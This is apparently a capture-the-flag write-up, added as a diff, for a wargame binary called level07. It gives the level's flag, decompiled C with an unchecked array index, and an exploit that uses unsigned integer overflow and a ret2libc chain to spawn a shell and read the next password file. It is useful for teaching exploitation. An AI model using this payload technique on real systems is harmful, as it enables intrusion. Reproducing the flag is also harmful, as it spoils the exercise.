@@ -1,0 +1,128 @@
+flag: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
+
+int main(int ac, char **av, char **env) {
+	char buff[100];
+	int ret;
+	char cmd[20];
+	bzero(buff, 100);
+	int stack_cannary = *(int *)(in_GS_OFFSET + 20);
+
+	for (; *av; av++) {
+		bzero(*av, strlen(*av));
+	}
+
+	// protection of the env ?
+	for (; *env; env++) {
+		bzero(*env, strlen(*env));
+	}
+
+	puts("Welcome");
+	while (true) {
+		printf("input: ");
+		fgets(cmd, 20, stdin);
+
+		int len = strlen(cmd);
+		cmd[len] = '\0'; // not sure
+
+	
+		if (!strncmp("store", cmd, 5)) {
+			ret = store_number(buff);
+		} else if (!strncmp("read", cmd, 4)) {
+			ret = read_number(buff);
+		} else if (!strncmp("quit", cmd, 4)) {
+			if (stack_cannary == in_GS_OFFSET + 20)
+				return 0;
+			stack_check_fail();
+		}
+
+		if (ret == 0) {
+			printf("Command %s executed", cmd);
+		} else {
+			printf("Failed to execute %s command", ret);
+		}
+
+		bzero(cmd, len);
+	}
+}
+
+
+int store_number(int *arr) {
+	uint nb;
+	uint index;
+
+	printf("number: ");
+	nb = get_unum(); // basically a scanf wrapper that returns an int
+
+	printf("index: ");
+	index = get_unum();
+
+	if ((index % 3 == 0) || (nb >> 24 == 0xb7)) {
+		puts("Error");
+		return 1;
+	}
+
+	*(arr+index*4) = nb;
+	return 0;
+}
+
+int read_number(int *arr) {
+  
+  printf(" Index: ");
+  int index = get_unum();
+  printf(" Number at data[%u] is %u\n",index, arr[index]);
+  return 0;
+}
+
+This level contains a stack canary: It is a random value in the stack which is checked
+at the end of the program to see if we didn't damage the stack.
+The level offers us to store and read values at a given index, but we can't store
+anything if the index is a multiple of 3.
+
+The array in which we store the values is 100 unsigned ints long. The program never
+checks if we enter an index superior to 100. This allows us to reach eip in the stack.
+But where is eip ? First, let's find how to input values that are multiples of 3.
+
+Like we saw in rainfall, we can just overflow the unsigned int. The program multiply
+the index given by 4, because the array is in unsigned int, So we calculate which value
+would overflow on the index we want to overwrite if multiplied by 4:
+
+	e = 4294967296 + i * 4 / 4
+	  = 4294967296/4 + i
+	  = 1073741824 + i
+
+	with: e = the value to enter as an index
+		  i = the real index we are targetting
+
+Now that we have our formula, let's find eip:
+
+for i in `seq 0 1 200`; do echo $i; (echo store; echo 42; echo $((1073741824+i)); echo quit) |  ./level07 >/dev/null ; done
+
+This loop try to insert a value on every index from 0 to 200 using our formula.
+
+The 106th index indicate a stack smashing: That's the canary.
+The 114th index just segfault: That's eip.
+
+Now that we have our eip, let's do a ret2libc:
+
+> p system
+0xf7e6aed0
+
+> p exit
+0xf7e5eb70
+
+> find __libc_start_main,+99999999,"/bin/sh"
+0xf7f897ec
+
+Now, we just got to translate theses addresses in decimal, and store them at the
+114th, 115th, and 116th indexes of the array, with 114 being in overflow mode.
+
+1073741824 + 114 = 1073741938
+
+0xf7e6aed0 = 4159090384
+0xf7e5eb70 = 4159040368
+0xf7f897ec = 4160264172
+
+Let's translate that to a payload:
+(echo store; echo 4159090384; echo 1073741938; echo store; echo 4159040368; echo 115; echo store; echo 4160264172; echo 116; echo quit; cat) | ./level07
+
+> cat /home/users/.pass
